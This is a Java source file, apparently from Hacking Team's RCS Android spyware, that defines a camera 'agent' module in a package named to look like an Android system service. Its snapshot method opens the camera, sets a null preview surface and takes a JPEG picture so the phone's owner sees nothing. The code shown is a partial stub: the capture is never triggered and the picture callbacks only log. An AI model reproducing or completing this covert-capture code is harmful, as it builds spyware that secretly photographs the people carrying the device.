/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module;

import java.io.IOException;

import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.ShutterCallback;
import android.view.SurfaceHolder;

import com.android.service.auto.Cfg;
import com.android.service.conf.ConfModule;
import com.android.service.util.Check;

//SNIPPET http://marakana.com/forums/android/examples/39.html
/**
 * The Class CameraAgent.
 */
public class AgentCamera extends BaseInstantModule {

	private static final String TAG = "AgentCamera"; //$NON-NLS-1$

	@Override
	public void actualStart() {
		// TODO Auto-generated method stub

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(1000);
		return true;
	}

	/**
	 * Snapshot.
	 * 
	 * @throws IOException
	 */
	private synchronized void snapshot() throws IOException {

		final ShutterCallback shutterCallback = new ShutterCallback() {

			public void onShutter() {
				if (Cfg.DEBUG) {
					Check.log(TAG + " onShutter");//$NON-NLS-1$
				}
			}
		};
		final PictureCallback rawCallback = new PictureCallback() {
			public void onPictureTaken(final byte[] _data, final Camera _camera) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " onPictureTaken RAW");//$NON-NLS-1$
				}
			}
		};
		final PictureCallback jpegCallback = new PictureCallback() {
			public void onPictureTaken(final byte[] _data, final Camera _camera) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " onPictureTaken JPEG");//$NON-NLS-1$
				}
			}
		};

		final Camera camera = Camera.open();
		final Camera.Parameters parameters = camera.getParameters();
		parameters.setPictureFormat(PixelFormat.JPEG);
		camera.setParameters(parameters);
		final SurfaceHolder holder = null;
		camera.setPreviewDisplay(holder);
		camera.stopPreview();
		camera.takePicture(shutterCallback, rawCallback, jpegCallback);

		camera.release();
	}

}
